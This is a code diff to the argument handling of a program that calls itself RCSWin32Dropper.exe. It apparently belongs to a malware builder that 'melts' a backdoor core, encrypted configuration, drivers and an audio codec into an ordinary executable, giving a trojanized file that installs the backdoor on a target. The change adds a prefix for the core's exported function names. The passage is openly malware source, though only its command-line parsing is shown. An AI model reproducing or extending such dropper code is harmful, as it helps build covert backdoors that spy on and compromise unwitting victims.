@@ -31,9 +31,9 @@ int main(int argc, char* argv[])
 	memset(&MS, 0, sizeof(MelterStruct));
 	MS.manifest = false;
 	
-	if (argc != 11) {
+	if (argc != 12) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <input> <output>\n\n");
+		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <prefix> <input> <output>\n\n");
 		printf("  <core> is the backdoor core\n");
 		printf("  <core64> is the 64 bit backdoor core\n");
 		printf("  <conf> is the backdoor encrypted configuration\n");
@@ -42,6 +42,7 @@ int main(int argc, char* argv[])
 		printf("  <codec> is the audio codec\n");
 		printf("  <instdir> is the backdoor install directory (on the target)\n");
 		printf("  <manifest> is a boolean flag for modifying the manifest\n");
+		printf("  <prefix> is the core exported function(s) name prefix\n");
 		printf("  <input> is the exe to be melted\n");
 		printf("  <output> is the output file\n\n");
 		return 0;
@@ -86,8 +87,11 @@ int main(int argc, char* argv[])
 	bf::path driverFile = MS.driver;
 	bf::path driver64File = MS.driver64;
 	bf::path codecFile = MS.codec;
-	bf::path exeFile = argv[9];
-	bf::path outputFile = argv[10];
+	bf::path exeFile = argv[10];
+	bf::path outputFile = argv[11];
+
+	_snprintf(MS.fprefix, 6, "%s", argv[9]);
+	printf("Function Prefix: %s\n", MS.fprefix);
 	
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
